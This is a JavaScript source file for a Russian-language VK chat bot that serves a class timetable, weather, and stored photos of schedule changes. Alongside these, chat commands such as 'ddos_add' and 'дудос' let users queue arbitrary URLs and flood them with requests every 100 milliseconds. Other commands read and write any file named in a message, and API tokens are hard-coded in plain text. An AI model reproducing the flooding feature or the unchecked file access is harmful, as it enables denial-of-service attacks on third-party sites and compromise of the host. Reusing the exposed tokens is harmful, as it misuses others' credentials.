const { VK } = require('vk-io');
const express = require('express');
const app = express();
const PORT = process.env.PORT ||80;
const vk = new VK({
    token: 'd23d84ce8f49e0f61fbbd72efcdc066cf1bcc5fcbfeb2176abd5f40537a986284009a2a28247c99e3df4a',
});
const XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const DAYS_IN_WEEK = 7;
const fs = require("fs");
var FileSaver = require('file-saver');
const Iconv = require('iconv-lite');



const MyRequest = require("request");
const Weather = require('./Scripts/Weather.js');

const weather = new Weather('http://api.openweathermap.org/data/2.5/weather?q=','&APPID=d160ea4124bd5a60d58084735ce6bb69');

//Запрос на сервер
var http = require("http");
const isDate = require("lodash");
const db = require('./Scripts/Db');



// db.CreateCollection("replacements");
//db.InsertOne({test:"test"},"replacements");
// db.GetData("replacements").then((res=>{
//     console.log(res[0].test);
// }))

//db.ClearData("replacements",{});

var ddosUrls = [];

function ddos() {
    for(var i=0;i<ddosUrls.length;i++){
        MyRequest(ddosUrls[i], function (error, response, body) {

        });
    }
    // MyRequest(ddosURL, function (error, response, body) {
    //     console.log('error:', error); // Print the error if one occurred
    //     console.log('statusCode:', response && response.statusCode); // Print the response status code if a response was received
    //     console.log('body:', body); // Print the HTML for the Google homepage.
    // });
}

var ddosInterval;

function getCurrentDayNumber(date) {
    return date.getDay();
}

class Table {
    constructor(){
        this.numenator = [];
        this.denominator = [];
    }

}

var table = new Table();

function timeToDays(time) {
    return time/1000/60/60/24;
}

var download = function(uri, filename, callback){
    MyRequest.head(uri, function(err, res, body){
        console.log('content-type:', res.headers['content-type']);
        console.log('content-length:', res.headers['content-length']);

        MyRequest(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
    });
};

function getCurrentWeekNumber(date){
    var weekNumber;
    var yearStart;
    var ts;

    if (isDate(date)) {
        ts = new Date(date);
    } else {
        ts = date ? new Date(date) : new Date();
    }

    ts.setHours(0, 0, 0);
    ts.setDate(ts.getDate() + 4 - (ts.getDay()||7));

    yearStart = new Date(ts.getFullYear(), 0, 1);

    weekNumber = Math.floor((timeToDays(ts - yearStart) + 1) / 7);

    return weekNumber;

}

table.denominator.push('Воскресенье');
table.numenator.push('Воскресенье');
//Понедельник
table.numenator.push(fs.readFileSync('понедельникч.txt', 'UTF-8'));

table.denominator.push(fs.readFileSync('понедельникз.txt', 'UTF-8'));

//вторник
table.numenator.push(fs.readFileSync('вторникч.txt', 'UTF-8'));

table.denominator.push(fs.readFileSync('вторникз.txt', 'UTF-8'));

//среда
 table.numenator.push(fs.readFileSync('средач.txt', 'UTF-8'));
//
table.denominator.push(fs.readFileSync('средаз.txt', 'UTF-8'));
//
// //Четверг
//
table.numenator.push(fs.readFileSync('четвергч.txt', 'UTF-8'));

table.denominator.push(fs.readFileSync('четвергз.txt', 'UTF-8'));

//
// //Пятница
table.numenator.push(fs.readFileSync('пятницач.txt', 'UTF-8'));

table.denominator.push(fs.readFileSync('пятницаз.txt', 'UTF-8'));

//
//
// //суббота
table.numenator.push(fs.readFileSync('субботач.txt', 'UTF-8'));

table.denominator.push(fs.readFileSync('субботаз.txt', 'UTF-8'));

//

vk.updates.hear(/ */,context =>  {
     //console.log(context.replyMessage.attachments[0].oggUrl);





    let message = context.message.text.toLowerCase().toString();
        if (message.indexOf('quality') !== -1) {
            //context.att
            context.sendPhoto('images/artur.jpg');
        }
        //
        if(message.indexOf("дудос")!==-1){
                //ddosURL = message.slice(message.indexOf(' ')+1,message.length);
                ddosInterval = setInterval(ddos,100);
        }

        if(message.includes("ddos_add")){
            ddosUrls.push(message.slice(message.indexOf(' ')+1,message.length))
        }

        if(message.includes("ddos_clear")){
            ddosUrls.splice(0,ddosUrls.length);
        }

        if(message.includes("ddos_status")){
            context.send(JSON.stringify(ddosUrls));
        }

        if(message.indexOf("cтопддос")!==-1){
            clearInterval(ddosInterval);
        }

        if(message.includes("mongotest")){



        }

        if(message.indexOf('распознай')!==-1){
            const request = require('request-promise')

            const uri = `https://api.wit.ai/speech`
            const apikey = 'BDHLF6R25UQW3YQUXRL2Z23BSXLEGXZC' // получаем ключ доступа на wit.ai

            var url = 'https://psv4.userapi.com/c852324//u157422070/audiomsg/d1/5b5814085c.ogg'

            const func = async (body) => {
                // отправляем post запрос с буфером аудио
                const response = await request.post({
                    uri,
                    headers: {
                        'Authorization': `Bearer ` + apikey,
                        'Content-Type': 'audio/ogg'
                        //'Transfer-Encoding': 'chunked'
                    },
                    body
                })
                // парсим ответ и отдаем результат расшифровки
                console.log(response);
                return response;
            }
            func(url).then(r=>{
                console.log(r);
            });
        }

        if(message.indexOf('загрузить замену нахуй')!==-1){
            //console.log(context.attachments[0]);
            var photocollection = context.attachments.map(x=>({"photo":x.largePhoto}));
             console.log(photocollection);
             let imagedata = context.attachments[0].largePhoto;

            db.ClearData('replacements');
            db.InsertMany(photocollection,'replacements');

            //db.InsertMany(photocollection,'replacements');

            //console.log(context.attachments[0].largePhoto);
        }

//
        if(message.indexOf('открыть ')!==-1){
            let title = message.slice(message.indexOf(' ')+1,message.length);
            let text = fs.readFileSync(title, 'UTF-8');
            context.send(text);
        }

        if(message.indexOf('добавить ')!==-1){
            // let title = message.slice(message.indexOf(' ')+1,message.length);
            // let text = fs.readFileSync(title, 'UTF-8');
           // let filestartI = 0;
            let fileEndI = 0;



            let spaceCount = 0;
            for(let i=0;i<message.length;i++){
                if(message[i]===" "){
                    spaceCount++
                }

                if(spaceCount===2){fileEndI = i;}

            }

            let title = message.slice(message.indexOf(' ')+1,fileEndI)

                //  console.log(title);

            console.log("123");
            let text = message.slice(fileEndI,message.length);

            console.log(text);

              fs.writeFileSync(title, text);
          // let fileTitle = second.slice()

            // let text = fs.readFileSync('test.txt', 'UTF-8');
            // context.send(text);
        }

        if(message.indexOf('перезаписать ')!==-1){
            let title = message.slice(message.indexOf(' ')+1,message.length);
            let text = fs.readFileSync(title, 'UTF-8');
            // let fileTitle = second.slice()

            // let text = fs.readFileSync('test.txt', 'UTF-8');
            // context.send(text);
        }

        //погода
        if(message.indexOf('погода')!==-1){
             let cityName = message.slice(message.indexOf(' ')+1,message.length);
            weather.GetWeather(cityName).then(function (res) {
                context.send(res);
            })

        }
        //помощь
        if(message.indexOf('артурчик помоги')!==-1){
            context.send('Команды:\n'+
                'расписание на понедельник\n'+
                'расписание на вторник\n'+
                'расписание на среду\n'+
                'расписание на четверг\n'+
                'расписание на пятницу\n'+
                'расписание на субботу\n'+
                'расписание на завтра\n'+
                'расписание на сегодня'+
                'расписание сессии'+
                'замены\n'+
                'quality\n'+
                'загрузить замену(прикрепить 1 фото)'+
                'погода {название города}\n'
            )
        }


        if (message.indexOf('замены нахуй') !== -1) {



            db.GetData('replacements').then(res=>{
                context.sendPhotos(res.map(x=>x.photo))
            })


        }


        if (message.indexOf('расписание на сегодня') !== -1) {
            let currentDay = new Date();
            let currentDayNumberValue = getCurrentDayNumber(currentDay);
            if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {
                context.send(table.denominator[currentDayNumberValue]);
            } else {
                context.send(table.numenator[currentDayNumberValue]);
            }
        }

        if (message.indexOf('расписание на завтра') !== -1) {
            let currentDay = new Date();
            let currentDayNumberValue = getCurrentDayNumber(currentDay);
            currentDayNumberValue++;
            if (currentDayNumberValue > 6) {
                currentDayNumberValue = 0;
            }
            if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {
                context.send(table.denominator[currentDayNumberValue]);
            } else {
                context.send(table.numenator[currentDayNumberValue]);
            }

        }





 if(message.indexOf('расписание')!==-1) {

        let date = new Date();
        let currentDayNumber = date.getDay();


     if (message.indexOf('расписание на понедельник') !== -1) {

         if(currentDayNumber===0||1<currentDayNumber) {

             if ( (getCurrentWeekNumber(Date.now())+1) % 2 !== 0) {
                 context.send(table.denominator[1]);
             } else {

                 context.send(table.numenator[1]);
             }
         }
         else{

                 if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {

                     context.send(table.denominator[1]);
                 } else {
                     context.send(table.numenator[1]);
                 }

         }

     }

     if (message.indexOf('расписание на вторник') !== -1) {
         if(currentDayNumber===0||2<currentDayNumber) {

             if ( (getCurrentWeekNumber(Date.now())+1) % 2 !== 0) {
                 context.send(table.numenator[2]);
             } else {
                 context.send(table.denominator[2]);
             }
         }
         else{

             if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {
                 context.send(table.denominator[2]);
             } else {
                 context.send(table.numenator[2]);
             }

         }

     }

     if (message.indexOf('расписание на среду') !== -1) {

         if(currentDayNumber===0||3<currentDayNumber) {

             if ((getCurrentWeekNumber(Date.now())+1) % 2 !== 0) {
                 context.send(table.numenator[3]);
             } else {
                 context.send(table.denominator[3]);
             }
         }
         else{

                 if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {
                     context.send(table.denominator[3]);
                 } else {
                     context.send(table.numenator[3]);
                 }
             }

     }

     if (message.indexOf('расписание на четверг') !== -1) {

         if(currentDayNumber===0||4<currentDayNumber) {

             if ((getCurrentWeekNumber(Date.now())+1) % 2 !== 0) {
                 context.send(table.numenator[4]);
             } else {
                 context.send(table.denominator[4]);
             }
         }
         else{



                 if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {
                     context.send(table.denominator[4]);
                 } else {
                     context.send(table.numenator[4]);
                 }
             }


     }

     if (message.indexOf('расписание на пятницу') !== -1) {

         if(currentDayNumber===0||5<currentDayNumber) {

             if ((getCurrentWeekNumber(Date.now())+1) % 2 !== 0) {
                 context.send(table.numenator[5]);
             } else {
                 context.send(table.denominator[5]);
             }
         }
         else{


                 if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {
                     context.send(table.denominator[5]);
                 } else {
                     context.send(table.numenator[5]);
                 }
             }

     }




     if (message.indexOf('расписание на субботу') !== -1) {

         if(currentDayNumber===0||6<currentDayNumber) {

             if ((getCurrentWeekNumber(Date.now())+1) % 2 !== 0) {
                 context.send(table.numenator[6]);
             } else {
                 context.send(table.denominator[6]);
             }
         }
         else{

                 if (getCurrentWeekNumber(Date.now()) % 2 !== 0) {
                     context.send(table.denominator[6]);
                 } else {
                     context.send(table.numenator[6]);
                 }

             }



     }



 }


//Получение списка юзверов
//   if(message.indexOf('инфо')!==-1){
//       vk.api.messages.getChat(141);
//   }

    }
);



vk.updates.start().catch(console.error);





app.listen(PORT,()=>{
    console.log('Server Started');
});
